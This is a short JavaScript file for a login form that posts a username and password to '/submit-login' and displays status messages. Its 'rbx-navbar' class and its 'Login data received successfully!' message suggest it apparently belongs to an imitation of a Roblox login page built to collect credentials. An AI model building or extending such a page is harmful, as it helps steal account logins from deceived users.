document.addEventListener('DOMContentLoaded', () => {
  const form = document.getElementById('login-form');
  const messageDiv = document.getElementById('message');
  const loginButton = document.getElementById('login-button');

  // Form submission handler
  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    // FIXED: Use URLSearchParams for urlencoded instead of FormData (multipart)
    const formData = new FormData(form);
    const params = new URLSearchParams();
    for (const [key, value] of formData) {
      params.append(key, value);
    }
    
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value;
    
    if (!username || !password) {
      showMessage('Please enter username and password', 'error');
      return;
    }

    // Disable button during submission
    loginButton.disabled = true;
    loginButton.textContent = 'Logging in...';

    try {
      const response = await fetch('/submit-login', {
        method: 'POST',
        body: params,  // Now urlencoded
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Accept': 'application/json',
        }
      });

      const data = await response.json();
      
      if (data.success) {
        showMessage(data.message || 'Login data received successfully!', 'success');
      } else {
        showMessage(data.error || 'Login failed', 'error');
      }
    } catch (error) {
      console.error('Submission error:', error);
      showMessage('Network error. Please try again.', 'error');
    } finally {
      loginButton.disabled = false;
      loginButton.textContent = 'Log In';
    }
  });

  function showMessage(text, type) {
    messageDiv.textContent = text;
    messageDiv.className = type;
    setTimeout(() => {
      messageDiv.textContent = '';
      messageDiv.className = '';
    }, 5000);
  }

  // Input animations
  const inputs = document.querySelectorAll('.login-input');
  inputs.forEach(input => {
    input.addEventListener('focus', () => input.parentElement.classList.add('focused'));
    input.addEventListener('blur', () => input.parentElement.classList.remove('focused'));
  });

  // Mobile menu
  const menuButton = document.querySelector('.menu-button');
  const nav = document.querySelector('.rbx-navbar');
  menuButton?.addEventListener('click', () => nav?.classList.toggle('open'));
});
